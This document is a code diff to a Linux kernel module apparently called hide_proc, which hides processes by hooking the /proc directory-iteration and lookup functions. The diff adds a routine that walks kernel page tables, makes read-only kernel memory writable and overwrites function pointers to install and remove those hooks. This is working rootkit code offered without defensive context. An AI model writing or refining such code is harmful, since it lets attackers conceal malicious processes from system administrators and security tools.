@@ -13,9 +13,8 @@
 #include <linux/dirent.h>
 #include <linux/vmalloc.h>
 #include <linux/dcache.h>
-
-#include "inline_hook/p_lkrg_main.h"
-#include "inline_hook/utils/p_memory.h"
+#include <asm/pgtable.h>
+#include <asm/tlbflush.h>
 
 // --- PID list management (copied from original) ---
 struct hidden_pid_entry {
@@ -184,13 +183,65 @@ static struct dentry * hooked_lookup(struct inode *dir, struct dentry *dentry, u
 
 // --- Init and Exit functions ---
 
-static int write_kernel_memory(void *addr, void *new_val, size_t size) {
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 8, 0)
-    return write_ro_memory(addr, new_val, size);
+static pte_t *get_pte_from_address(unsigned long addr)
+{
+    pgd_t *pgd;
+    p4d_t *p4d;
+    pud_t *pud;
+    pmd_t *pmd;
+
+    pgd = pgd_offset_k(addr);
+    if (pgd_none(*pgd) || pgd_bad(*pgd))
+        return NULL;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
+    p4d = p4d_offset(pgd, addr);
+    if (p4d_none(*p4d) || p4d_bad(*p4d))
+        return NULL;
+    pud = pud_offset(p4d, addr);
 #else
-    return remap_write_range(addr, new_val, size, true);
+    pud = pud_offset(pgd, addr);
 #endif
+    if (pud_none(*pud) || pud_bad(*pud))
+        return NULL;
+
+    pmd = pmd_offset(pud, addr);
+    if (pmd_none(*pmd) || pmd_bad(*pmd))
+        return NULL;
+
+    return pte_offset_kernel(pmd, addr);
 }
+
+static int write_ro_kernel_data(void *addr, void *new_val_ptr, size_t size)
+{
+    pte_t *pte;
+    unsigned int level;
+
+    pte = lookup_address((unsigned long)addr, &level);
+    if (!pte) {
+        // Fallback for some architectures or kernel versions
+        pte = get_pte_from_address((unsigned long)addr);
+        if (!pte) {
+            printk(KERN_ERR "[hide_proc] Failed to get PTE for address %p\n", addr);
+            return -EFAULT;
+        }
+    }
+
+    if (!(pte_val(*pte) & PTE_WRITE)) {
+        set_pte_atomic(pte, pte_mkwrite(*pte));
+    }
+    
+    // On ARM64, TLB must be flushed after changing permissions
+    flush_tlb_kernel_range((unsigned long)addr, (unsigned long)addr + size);
+
+    memcpy(addr, new_val_ptr, size);
+
+    set_pte_atomic(pte, pte_wrprotect(*pte));
+    flush_tlb_kernel_range((unsigned long)addr, (unsigned long)addr + size);
+
+    return 0;
+}
+
 
 int hide_proc_init(void) {
     struct path proc_path;
@@ -234,12 +285,12 @@ int hide_proc_init(void) {
     
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
     if (fops->iterate_shared) {
-        ret = write_kernel_memory(&fops->iterate_shared, &hooked_iterate, sizeof(void *));
+        ret = write_ro_kernel_data(&fops->iterate_shared, &hooked_iterate, sizeof(void *));
     } else {
-        ret = write_kernel_memory(&fops->iterate, &hooked_iterate, sizeof(void *));
+        ret = write_ro_kernel_data(&fops->iterate, &hooked_iterate, sizeof(void *));
     }
 #else
-    ret = write_kernel_memory(&fops->readdir, &hooked_iterate, sizeof(void *));
+    ret = write_ro_kernel_data(&fops->readdir, &hooked_iterate, sizeof(void *));
 #endif
     if (ret) {
         preempt_enable();
@@ -247,13 +298,13 @@ int hide_proc_init(void) {
         return ret;
     }
 
-    ret = write_kernel_memory(&iops->lookup, &hooked_lookup, sizeof(void *));
+    ret = write_ro_kernel_data(&iops->lookup, &hooked_lookup, sizeof(void *));
     if (ret) {
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-        if (fops->iterate_shared) write_kernel_memory(&fops->iterate_shared, &original_iterate, sizeof(void *));
-        else write_kernel_memory(&fops->iterate, &original_iterate, sizeof(void *));
+        if (fops->iterate_shared) write_ro_kernel_data(&fops->iterate_shared, &original_iterate, sizeof(void *));
+        else write_ro_kernel_data(&fops->iterate, &original_iterate, sizeof(void *));
 #else
-        write_kernel_memory(&fops->readdir, &original_iterate, sizeof(void *));
+        write_ro_kernel_data(&fops->readdir, &original_iterate, sizeof(void *));
 #endif
         preempt_enable();
         printk(KERN_ERR "[hide_proc] Failed to hook lookup function.\n");
@@ -291,12 +342,12 @@ void hide_proc_exit(void) {
 
     preempt_disable();
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-    if (fops->iterate_shared) write_kernel_memory(&fops->iterate_shared, &original_iterate, sizeof(void *));
-    else write_kernel_memory(&fops->iterate, &original_iterate, sizeof(void *));
+    if (fops->iterate_shared) write_ro_kernel_data(&fops->iterate_shared, &original_iterate, sizeof(void *));
+    else write_ro_kernel_data(&fops->iterate, &original_iterate, sizeof(void *));
 #else
-    write_kernel_memory(&fops->readdir, &original_iterate, sizeof(void *));
+    write_ro_kernel_data(&fops->readdir, &original_iterate, sizeof(void *));
 #endif
-    write_kernel_memory(&iops->lookup, &original_lookup, sizeof(void *));
+    write_ro_kernel_data(&iops->lookup, &original_lookup, sizeof(void *));
     preempt_enable();
 
     clear_hidden_pids();
